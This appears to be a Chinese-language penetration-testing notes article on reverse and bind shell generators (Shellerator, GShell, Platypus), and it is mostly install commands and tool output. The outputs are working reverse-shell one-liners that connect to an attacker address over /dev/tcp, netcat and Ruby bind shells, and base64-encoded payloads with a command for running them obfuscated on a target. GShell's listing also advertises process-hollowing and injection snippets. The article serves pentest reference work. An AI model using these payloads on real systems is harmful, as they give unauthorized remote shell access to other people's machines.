---
layer: article
title: Reverse/Bind Shells
tags: tools,pentest
---

在日常的渗透测试过程中，获得了webshell后往往会反弹shell，这里整理了几个工具。

涉及举例：

本地攻击机IP为`111.111.111.111` ，若反向连接时监听端口`111`

被攻击靶机IP为`192.168.1.1`，若正向连接时监听端口`888`

# [Shellerator](https://github.com/ShutdownRepo/shellerator)

## 安装

Kali Linux上需要单独安装Shellerator，安装完成后通过执行python文件或者`~/.local/bin/shellerator` 均可，如需也可以`sudo cp ~/.local/bin/shellerator /usr/sbin`方便快速执行`shellerator` 。

```bash
$ git clone https://github.com/ShutdownRepo/shellerator
$ cd shellerator
$ python3 setup.py install --user
$ python shellerator.py -l
Reverse shells
   - awk
   - bash
   - groovy
   - java
   - lua
   - meterpreter
   - ncat
   - netcat
   - nodejs
   - openssl
   - perl
   - php
   - powershell
   - python
   - ruby
   - socat
   - tclsh
   - telnet
   - war

Bind shells
   - netcat
$ ls
assets  build  dist  LICENSE  README.md  requirements.txt  setup.py  shellerator.egg-info  shellerator.py
# 如需
$ sudo ln -s $(pwd)/shellerator.py /usr/local/bin/shellerator.py && chmod +x /usr/local/bin/shellerator.py
```

## 使用

```bash
usage: shellerator.py [-h] [-b | -r] [-t TYPE] [-p LPORT] [-i LHOST]

Generate a bind/reverse shell

optional arguments:
  -h, --help              show this help message and exit
  -l, --list            Print all the types of shells shellerator can generate
  -b, --bind-shell        Generate a bind shell (you connect to the target)
  -r, --reverse-shell     Generate a reverse shell (the target connects to you)(Default)

Bind shell options:
  -t TYPE, --type TYPE    Type of the shell to generate (Bash, Powershell, Java...)
  -p LPORT, --port LPORT  Listener Port

Reverse shell options:
  -t TYPE, --type TYPE    Type of the shell to generate (Bash, Powershell, Java...)
  -i LHOST, --ip LHOST    Listener IP address
  -p LPORT, --port LPORT  Listener Port
```

## 实例

- 生成bash脚本，在被攻击靶机上执行，反弹shell到攻击机的`111`端口

```bash
$ python shellerator.py -r -lp 111 -t bash 
(custom) Listener interface/address?
> 111.111.111.111

[1] /bin/bash -c '/bin/bash -i >& /dev/tcp/111.111.111.111/111 0>&1'

[2] /bin/bash -c '/bin/bash -i > /dev/tcp/111.111.111.111/111 0<&1 2>&1'

[3] /bin/bash -i > /dev/tcp/111.111.111.111/111 0<& 2>&1

[4] bash -i >& /dev/tcp/111.111.111.111/111 0>&1

[5] exec 5<>/dev/tcp/111.111.111.111/111;cat <&5 | while read line; do $line 2>&5 >&5; done

[6] exec /bin/sh 0</dev/tcp/111.111.111.111/111 1>&0 2>&0

[7] 0<&196;exec 196<>/dev/tcp/111.111.111.111/111; sh <&196 >&196 2>&196

[8] UDP bash -i >& /dev/udp/111.111.111.111/111 0>&1

[9] UDP Listener (attacker) nc -u -lvp 111

CLI command used
shellerator.py --reverse-shell --type bash --lhost 111.111.111.111 --lport 111

```

- 生成`nc`命令，在被攻击靶机上执行，开启`888`端口

```bash
$ python shellerator.py -b  
(custom) Listener port?
> 888

[1] nc -lvp 888 -e /bin/sh

CLI command used
shellerator.py --bind-shell --type netcat --lport 888
```

# [GShell](https://github.com/nozerobit/gshell)

## 安装

Kali Linux上需要单独安装GShell，安装完成后通过执行python文件或者`~/.local/bin/shellerator` 均可，如需也可以`sudo cp ~/.local/bin/shellerator /usr/sbin`方便快速执行。

```bash
$ git clone https://github.com/nozerobit/gshell        
$ cd gshell 
$ bash setup.sh
$ python gshell.py -l
[+] These are the available bind shells
- powercat
- ruby
- python
- socat
- php
- perl
- nc
[+] These are the available reverse shells
- python
- ncat
- asp
- java
- war
- nc
- jsp
- csh
- bash
- ruby
- elf
- zsh
- exe
- go
- powershell
- javascript
- macho
- bsh
- ash
- awk
- telnet
- openssl
- socat
- php
- ksh
- csharp
- lua
- perl
- sh
[+] These are the available process hollowing code snippets
- csharp
[+] These are the available process injectors code snippets
- csharp
$ ls          
evasion  gshell.py  LICENSE  mdextract  README.md  requirements.txt  setup.sh  shellcodes  shells  snippets
# 如需
$ sudo ln -s $(pwd)/gshell.py /usr/local/bin/gshell.py && chmod +x /usr/local/bin/gshell.py
```



## 使用

~~~bash
usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--linux] [--base64] [--base32] [--base16] [--url] [--no-block]
                 [-l] [-a] [-h]

 ██████  ███████ ██   ██ ███████ ██      ██      
██       ██      ██   ██ ██      ██      ██      
██   ███ ███████ ███████ █████   ██      ██      
██    ██      ██ ██   ██ ██      ██      ██      
 ██████  ███████ ██   ██ ███████ ███████ ███████ 

Generate shellcodes, bind shells and/or reverse shells with style

            Version: 1.2
            Author: nozerobit
            Twitter: @nozerobit

Options:
  -i <IP ADDRESS>, --ip <IP ADDRESS>
                        Specify the IP address
  -p <PORT NUMBER>, --port <PORT NUMBER>
                        Specify the port number
  -s <SHELL TYPE>, --shell <SHELL TYPE>
                        Specify a shell type (python, nc, bash, etc)

Payload Types:
  -r, --reverse         Victim communicates back to the attacking machine
  -b, --bind            Open up a listener on the victim machine

Snippets Types:
  --hollowing           Print process hollowing code snippets
  --injector            Print process injector code snippets

Shellcode Required Options:
  --shellcode           Generate shellcodes, requires --srev or --sbind and --linux
  --srev                Reverse shell shellcode
  --sbind               Bind shell shellcode
  --linux               Linux shellcode

Encoding Options:
  --base64              Add base64 encoding
  --base32              Add base32 encoding
  --base16              Add base16 encoding
  --url                 Add URL encoding

Markdown Options:
  --no-block            Skip ```
                        code
                        blocks
                        ``` while parsing

Help Options:
  -l, --list            List the available shell types
  -a, --advice          Print advice and tips to get connections
  -h, --help            Show this help message and exit

~~~



## 实例

- 生成bash脚本，在被攻击靶机上执行，反弹shell到攻击机的`111`端口

```bash
$ python gshell.py -i 111.111.111.111 -p 111   -r -s bash 
[+] Shell type is valid
[+] The IPv4 address: 111.111.111.111 is valid.
[+] The port number: 111 is valid.
[+] Preparing reverse shells
[+] Generating bash shells
bash -i >& /dev/tcp/111.111.111.111/111 0>&1

----------------NEXT CODE BLOCK----------------

0<&196;exec 196<>/dev/tcp/111.111.111.111/111; sh <&196 >&196 2>&196

----------------NEXT CODE BLOCK----------------

/bin/bash -l > /dev/tcp/111.111.111.111/111 0<&1 2>&1

----------------NEXT CODE BLOCK----------------

bash -i >& /dev/tcp/111.111.111.111/111 0>&1

----------------NEXT CODE BLOCK----------------

bash -i >& /dev/udp/111.111.111.111/111 0>&1
                      
```

可以进行`base64`编码，同时支持`base32`、`base16`、`url`编码

```bash
$ python gshell.py -i 111.111.111.111 -p 111   -r -s bash  --base64 
[+] Shell type is valid
[+] The IPv4 address: 111.111.111.111 is valid.
[+] The port number: 111 is valid.
[+] Preparing reverse shells
[+] Generating bash shells
[+] Answer with: Windows or Nix
[!] Do you want to base64 encode for Windows or Nix? Nix
[+] Adding Nix base64 Encoding
[!] Warning: If the code contains multiple lines, decode each line one-by-one.
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvMTExIDA+JjE=

----------------NEXT CODE BLOCK----------------

MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvMTExOyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY=

----------------NEXT CODE BLOCK----------------

L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTExLjExMS4xMTEuMTExLzExMSAwPCYxIDI+JjE=

----------------NEXT CODE BLOCK----------------

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvMTExIDA+JjE=

----------------NEXT CODE BLOCK----------------

YmFzaCAtaSA+JiAvZGV2L3VkcC8xMTEuMTExLjExMS4xMTEvMTExIDA+JjE=
```

在目标机器上执行`bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvMTExIDA+JjE=}|{base64,-d}|{bash,-i}'`

- 生成命令，在被攻击靶机上执行，开启`888`端口

```bash
$ python gshell.py -b -p 888 -s ruby
[+] Shell type is valid
[+] The port number: 888 is valid.
[+] Preparing bind shells
[+] Generating ruby shells
ruby -rsocket -e 'f=TCPServer.new(888);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'s)'
```




# [Platypus](https://github.com/WangYihang/Platypus)
## 安装

**仍在开发，待稳定更新**

## 使用

**仍在开发，待稳定更新**

## 实例

- 生成bash脚本，在被攻击靶机上执行，反弹shell到攻击机的`111`端口
- 生成命令，在被攻击靶机上执行，开启`888`端口

**仍在开发，待稳定更新**